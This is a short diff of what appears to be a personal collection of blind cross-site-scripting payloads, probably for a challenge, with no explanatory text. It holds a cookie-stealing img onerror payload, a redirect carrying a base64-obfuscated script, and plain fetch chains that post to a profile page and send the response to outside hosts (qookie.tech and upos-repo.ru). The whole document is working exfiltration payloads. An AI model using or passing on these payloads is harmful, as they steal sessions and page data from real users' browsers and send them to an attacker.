@@ -5,3 +5,16 @@ blind:
 s = base64encode(fetch('http://{IP}:{PORT}/?cookie='+document.cookie))
 
 <img src=x onerror='eval(atob(s));' />
+
+
+<body>
+<script>
+window.location = 'http://qookie.tech:30057/?send=%3Cscript%3Eeval%28atob%28%22ZmV0Y2goImh0dHA6Ly9xb29raWUudGVjaDozMDA1Ny9wcm9maWxlLnBocD9hcHBseT0xIix7bWV0aG9kOiJQT1NUIixib2R5OiJjb2RlPTEiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQifX0pLnRoZW4ocmVzcG9uc2U9PnJlc3BvbnNlLnRleHQoKSkudGhlbih0ZXh0PT5mZXRjaCgiaHR0cDovL3Vwb3MtcmVwby5ydTo0NDQzLz9jPSIrYnRvYShTdHJpbmcuZnJvbUNoYXJDb2RlKC4uLm5ldyBUZXh0RW5jb2RlcigpLmVuY29kZSh0ZXh0KSkpKSk7%22%29%29%3C%2Fscript%3E'
+</script>
+</body>
+
+
+eval(atob("ZmV0Y2goImh0dHA6Ly9xb29raWUudGVjaDozMDA1Ny9wcm9maWxlLnBocD9hcHBseT0xIix7bWV0aG9kOiJQT1NUIixib2R5OiJjb2RlPTEiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQifX0pLnRoZW4ocmVzcG9uc2U9PnJlc3BvbnNlLnRleHQoKSkudGhlbih0ZXh0PT5mZXRjaCgiaHR0cDovL3Vwb3MtcmVwby5ydTo0NDQzLz9jPSIrYnRvYShTdHJpbmcuZnJvbUNoYXJDb2RlKC4uLm5ldyBUZXh0RW5jb2RlcigpLmVuY29kZSh0ZXh0KSkpKSk7"))
+
+fetch("http://{URL}/profile.php?apply=1",{method:"POST",body:"code=1",headers:{"Content-Type":"application/x-www-form-urlencoded"}}).then(response=>response.text()).then(text=>fetch("http://upos-repo.ru:4443/?c="+btoa(String.fromCharCode(...new TextEncoder().encode(text)))));
+fetch("http://localhost:3000/profile.php",).then(response=>response.text()).then(text=>fetch("http://upos-repo.ru:4443/?c="+btoa(String.fromCharCode(...new TextEncoder().encode(text)))));
